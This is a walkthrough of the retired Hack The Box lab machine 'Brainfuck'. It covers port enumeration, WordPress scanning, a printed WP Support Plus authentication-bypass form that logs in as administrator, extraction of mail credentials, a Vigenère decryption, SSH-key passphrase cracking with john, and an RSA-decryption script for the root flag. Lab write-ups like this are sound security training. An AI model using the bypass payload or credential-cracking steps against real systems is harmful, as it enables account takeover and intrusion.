![logo](/logo.png)

# [Brainfuck- BOX]  
Hi folks, today I am going to solve an Insaine rated hack the box machine which was released on 20 Apr 2017 as the 13th machine on HTB,Brainfuck created by ch4p.So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *tcp
  *Nginx
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/brainfuck 10.10.10.17
```

###### Output 

![](/Linux/Linux-Insane/Brainfuck/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/brainfuck 10.10.10.17                                                                                       ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-16 18:48 EAT
Nmap scan report for 10.10.10.17
Host is up (0.38s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) PIPELINING UIDL AUTH-RESP-CODE RESP-CODES TOP USER CAPA
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: capabilities post-login AUTH=PLAINA0001 have listed more LITERAL+ IMAP4rev1 OK Pre-login SASL-IR LOGIN-REFERRALS ID IDLE ENABLE
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_http-title: Welcome to nginx!
| tls-alpn: 
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 180.02 seconds
```

looking at the results  we find out that there are 5 ports open and its a `Ubuntu`and its running an `Nginx 1.10.0`. 

port[22]-ssh
port[25]- smtp
port[110]-pop3
pott[143]-imap
port[443]-http

when we naviagate to [https://10.10.10.17](https://10.10.10.17)  we find a page of  Nginx

![](/Linux/Linux-Insane/Brainfuck/Screenshots/Nginx.png)

so before we got this page were able to accept a certificate but lets first add the host name and to the host file

![](/Linux/Linux-Insane/Brainfuck/Screenshots/etc.png)

so lets check the added host `one by one`  upon looking at `www.brainfuck.htb` which is a wordpress site. and their is an email support for `orestis@brainfuck.htb`

![](/Linux/Linux-Insane/Brainfuck/Screenshots/brainfuck.png)

so because I do not know the wordpress  version so i start a `wpscan` to find for vulnerablities on a wordpress plugin and general

```sh
wpscan --url https://brainfuck.htb -e ap --plugins-detection aggressive  --disable-tls-checks --ignore-main-redirect
```

![](/Linux/Linux-Insane/Brainfuck/Screenshots/wpscan.png)

![](/Linux/Linux-Insane/Brainfuck/Screenshots/exploit2.png)
so according to the `wpscan` we can find that their is a support ticket so that seem vulnerable so lets act upon it 

```sh
searchsploit WP support Plus
```

![](/Linux/Linux-Insane/Brainfuck/Screenshots/searchsploit.png)

so lets examine the exploit

![](/Linux/Linux-Insane/Brainfuck/Screenshots/examine.png)

```sh
1. Description

You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().

http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html

2. Proof of Concept

<form method="post" action="https:/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="administrator">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>

Then you can go to admin panel.
```

so we add the url to tha action and beable to start a python server so that we can use it to execute the login.

![](/Linux/Linux-Insane/Brainfuck/Screenshots/server.png)


so it has finish execuring but we cannot see anything 

![](Linux/Linux-Insane/Brainfuck/Screenshots/reloaded.png)


so upon going back to `brainfuck.htb` we have been succesful logged in 

![](/Linux/Linux-Insane/Brainfuck/Screenshots/loggedin.png)

so let check if we are able to get any php edits so that we can get shell on the box. Upon checking we can not be able to exploit that way becuase we can not edit but beacuse we so something on the ticketing page about intergration lets look for it.

![](/Linux/Linux-Insane/Brainfuck/Screenshots/wordpress.png)

so us you see the password is masked but we can be able to get it via via looking at inspect 

![](/Linux/Linux-Insane/Brainfuck/Screenshots/inspect.png)

so because we have an smtp creds for `orestis` lets launch `evolution` to authenicate and see email that are their.

![](/Linux/Linux-Insane/Brainfuck/Screenshots/evolution1.png)

![](/Linux/Linux-Insane/Brainfuck/Screenshots/evolution2.png)

![](/Linux/Linux-Insane/Brainfuck/Screenshots/evolution3.png)

so after entering the password earlier from the inspect a see an email on the mail by `root@brainfuck.htb`

![](/Linux/Linux-Insane/Brainfuck/Screenshots/info.png)

since we have gotten credential to the `sup3rs3cr3t.brainfuck.htb` lets log in 

![](/Linux/Linux-Insane/Brainfuck/Screenshots/forum.png)

so i decide to look in the pages but find something interesting but seems that it was encrypted with an enigma which is vulnerable to plain text 

```code
EN:Pieagnm - Jkoijeg nbw zwx mle grwsnn
PT:Orestis - Hacking for fun and profit
```

![](/Linux/Linux-Insane/Brainfuck/Screenshots/enigma.png)


so its a `vigener ` so we such for the key and we find that the key is `fuckmybrain` we use this link [Vigenere](https://rumkin.com/tools/cipher/vigenere/)

![](/Linux/Linux-Insane/Brainfuck/Screenshots/key.png)

Then from this url we download the id_rsa  [https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa](https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa)

it show encrypted so we would have to use john to decrypt it

![](/Linux/Linux-Insane/Brainfuck/Screenshots/encrypted.png)

```sh
ssh2john id_rsa > id_john
```

![](/Linux/Linux-Insane/Brainfuck/Screenshots/john.png)

now that we have the password lets login with the ssh key

![](/Linux/Linux-Insane/Brainfuck/Screenshots/shell.png)

we csn be able to get the `user flag` 

![](/Linux/Linux-Insane/Brainfuck/Screenshots/user.png)

Looking at the contents of the files in the `/home/orestis directory`, specifically `encrypt.sage`, it
appears that the file `output.txt` contains an encrypted root flag and the file `debug.txt` contains the P, Q and E values used to do the encryption. 

![](/Linux/Linux-Insane/Brainfuck/Screenshots/rsaen.png)

We can use this to decode the string of of the `root flag`

```sh
from sympy import mod_inverse

def rsa_decrypt(ciphertext, p, q, e):
    # Step 1: Compute n
    n = p * q

    # Step 2: Compute φ(n)
    phi_n = (p - 1) * (q - 1)

    # Step 3: Compute private exponent d
    d = mod_inverse(e, phi_n)

    # Step 4: Decrypt the ciphertext
    decrypted_message = pow(ciphertext, d, n)
    
    return decrypted_message

def main():
    # Example values (replace with actual values)
    p = x.x.x.x.x4460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
  # Example prime
    q = x.x.x.x.x.845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
  # Example prime
    e = x.x.x.x.x.38015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
   # Example public exponent
    ciphertext = x.x.x.x.4134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
  # Example ciphertext (numerical form)

    decrypted_message = rsa_decrypt(ciphertext, p, q, e)
    
    print(f"Decrypted Message: {decrypted_message}")

if __name__ == "__main__":
    main()
```

![](/Linux/Linux-Insane/Brainfuck/Screenshots/decrypt.png)

To convert the plaintext result from decimal to ASCII, the following command can be used

```sh
import binascii

# Your large number
number = x.x.x.x.9245867880966944246662849341507003750

# Convert number to hexadecimal string
hex_string = format(number, 'x')

# Convert hexadecimal string to bytes
byte_data = binascii.unhexlify(hex_string)

# Decode bytes to a readable string
decoded_string = byte_data.decode('utf-8')

print(decoded_string)
```

![](/Linux/Linux-Insane/Brainfuck/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley----------------------

